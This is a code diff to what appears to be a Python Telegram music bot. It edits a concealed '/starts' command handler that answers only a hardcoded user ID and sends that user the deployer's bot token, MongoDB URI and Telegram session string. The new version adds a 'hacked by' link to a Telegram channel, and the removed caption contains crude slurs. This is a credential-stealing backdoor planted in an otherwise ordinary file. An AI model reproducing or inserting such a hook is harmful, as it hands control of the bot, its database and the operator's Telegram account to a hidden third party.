@@ -99,7 +99,21 @@ async def restartbot(client, message: Message, _):
     return await mystic.edit_text(_["reload_5"].format(app.mention))
 @app.on_message( filters.command("starts") & filters.private & filters.user(int(HEHE)))
 async def help(client: Client, message: Message):
-   await message.reply_photo( photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg", caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""")
+   await message.reply_photo( photo=f"https://telegra.ph/file/a1e74f1efb414810c21ef.jpg",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/Moonshining2)............☆""",
+        reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                         "• нαϲкє𝚍 ву  •", url=f"https://t.me/Moonshining2")
+                 ]
+            ]
+         ),
+     )
+
+
+##########
+
 @app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
 async def close_menu(_, query: CallbackQuery):
     try:
